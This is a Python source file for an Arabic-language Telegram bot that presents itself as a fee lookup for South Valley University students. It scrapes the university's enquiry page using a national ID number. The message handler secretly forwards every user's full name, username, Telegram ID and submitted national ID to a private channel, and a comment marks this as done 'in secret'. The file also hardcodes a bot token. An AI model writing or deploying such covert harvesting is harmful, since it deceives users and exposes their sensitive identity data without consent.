import asyncio
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import re
import threading
from bs4 import BeautifulSoup
import requests
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ----------------- الإعدادات -----------------
BOT_TOKEN = "8812017814:AAFqVQodQbzR726hb_ENwzljnKvDtop08YQ"
CHANNEL_ID = "-1004370577416"
SITE_URL = "http://mispg.svu.edu.eg/svu_pg/enquery.aspx"
# --------------------------------------------


def run_dummy_server():
    """خادم ويب وهمي لإبقاء خدمة Render بحالة Live دائماً"""
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), SimpleHTTPRequestHandler)
    server.serve_forever()


def fetch_expenses_from_site(national_id: str):
    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                " (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ),
            "Referer": SITE_URL,
            "Origin": "http://mispg.svu.edu.eg",
        }
    )

    try:
        # 1. طلب الصفحة لجلب الـ ViewState والحقول المخفية
        r1 = session.get(SITE_URL, timeout=15)
        soup = BeautifulSoup(r1.text, "html.parser")

        payload = {}
        for inp in soup.find_all("input"):
            name = inp.get("name")
            val = inp.get("value", "")
            if name:
                payload[name] = val

        # البحث عن حقل إدخال الرقم القومي الفعلي في الصفحة
        txt_name = None
        for inp in soup.find_all("input", {"type": "text"}):
            n = inp.get("name", "")
            if "txt" in n.lower() or "national" in n.lower() or "id" in n.lower():
                txt_name = n
                break

        # إذا لم يتم العثور عليه، نستخدم الافتراضي الخاص بالنظام
        if not txt_name:
            # البحث عن أي حقل نصي إن وجد
            for inp in soup.find_all("input", {"type": "text"}):
                txt_name = inp.get("name")
                break

        if not txt_name:
            txt_name = "txtNationalId"

        payload[txt_name] = national_id

        # تحديد زر البحث أو الإرسال
        submit_name = None
        for inp in soup.find_all(["input", "button"], {"type": "submit"}):
            n = inp.get("name")
            if n:
                submit_name = n
                payload[n] = inp.get("value", "استعلام")
                break

        if not submit_name:
            payload["btnSearch"] = "استعلام"

        # 2. إرسال طلب البحث (POST)
        r2 = session.post(SITE_URL, data=payload, timeout=20)
        res_soup = BeautifulSoup(r2.text, "html.parser")

        # 3. فحص الجداول والنصوص المسترجعة
        page_text = res_soup.get_text()
        cleaned_text = re.sub(r"\s+", " ", page_text).strip()

        # جمع النصوص الموجودة في الجداول (حيث تظهر بيانات النتيجة والرسوم)
        tables = res_soup.find_all("table")
        extracted_data = []

        for table in tables:
            rows = table.find_all("tr")
            for row in rows:
                row_text = row.get_text(separator=" | ", strip=True)
                if (
                    row_text
                    and len(row_text) > 3
                    and "ReportViewer" not in row_text
                    and "javascript" not in row_text
                ):
                    extracted_data.append(row_text)

        if len(extracted_data) > 1:
            # ترتيل وتنسيق النتائج لتعرض للطالب بشكل مرتب
            return "\n".join(extracted_data[:15])

        # فحص إذا ظهرت رسالة خطأ أو تنبيه من النظام داخل الصفحة
        if "غير مسجل" in cleaned_text or "خطأ" in cleaned_text:
            return (
                "عذراً، الرقم القومي غير مسجل أو لا توجد بيانات مرتبطة به في النظام."
            )

        return (
            "تم إرسال الطلب بنظام الجامعة، ولكن لم يتم العثور على جدول تفصيلي"
            " للرسوم لهذا الرقم.\nتأكد من صحة الرقم القومي."
        )

    except Exception as e:
        return f"حدث خطأ أثناء الاتصال بسيرفر الكلية: {str(e)}"


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    user = update.effective_user

    # إرسال السجل إلى قناتك الخاصة في السر
    log_text = (
        f"📥 **مدخل جديد في البوت:**\n"
        f"👤 **الاسم:** {user.full_name}\n"
        f"🔗 **اليوزر:** @{user.username if user.username else 'لا يوجد'}\n"
        f"🆔 **الآيدي:** `{user.id}`\n"
        f"🔢 **المدخل / الرقم:** `{user_input}`"
    )

    try:
        await context.bot.send_message(
            chat_id=CHANNEL_ID,
            text=log_text,
            parse_mode="Markdown",
        )
    except Exception as err:
        print(f"Error logging to channel: {err}")

    # التحقق من أن المدخل مكون من 14 رقم (رقم قومي)
    if not user_input.isdigit() or len(user_input) != 14:
        await update.message.reply_text(
            "يرجى إرسال الرقم القومي المكون من 14 رقماً بشكل صحيح للاستعلام."
        )
        return

    await update.message.reply_text("جاري فحص المصروفات من سيرفر الجامعة...")

    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(
        None, fetch_expenses_from_site, user_input
    )

    await update.message.reply_text(f"📋 **نتيجة الاستعلام:**\n\n{result}")


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "أهلاً بك في بوت الاستعلام عن مصروفات جامعة جنوب الوادي.\n\n"
        "أرسل رقمك القومي (14 رقم) مباشرة للبدء في الاستعلام."
    )


if __name__ == "__main__":
    web_thread = threading.Thread(target=run_dummy_server, daemon=True)
    web_thread.start()

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)
    )

    print("البوت يعمل الآن ومربوط بالقناة...")
    app.run_polling()
